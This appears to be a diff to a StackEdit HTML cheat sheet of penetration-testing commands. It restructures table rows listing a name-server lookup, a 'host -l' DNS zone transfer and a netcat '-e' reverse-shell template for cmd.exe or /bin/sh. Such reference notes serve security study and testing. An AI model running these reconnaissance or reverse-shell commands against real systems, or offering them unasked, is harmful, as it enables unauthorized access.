@@ -11,12 +11,10 @@
     <td>host -t ns <i>domain</i></td>
 	<td>ask the name servers for a domain</td>
   </tr>
-</table>
-<table>
-	<tr>
-		<td>host -l <i>domain nameServer</td>
-		<td>dns zone transfer</td>
-	</tr>
+  <tr>
+	<td>host -l <i>domain nameServer</td>
+	<td>dns zone transfer</td>
+  </tr>
 	<tr>
 		<td>nc <i>ip port</i> -e <i>shell</td>
 		<td>start reverse shell: cmd.exe, /bin/sh</td>
@@ -35,5 +33,5 @@
 	</tr>
 </table>
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTIxOTgzMjUyNiwtMTk2NjU4ODUxNV19
+eyJoaXN0b3J5IjpbLTQwNDA2NDgxOSwtMTk2NjU4ODUxNV19
 -->
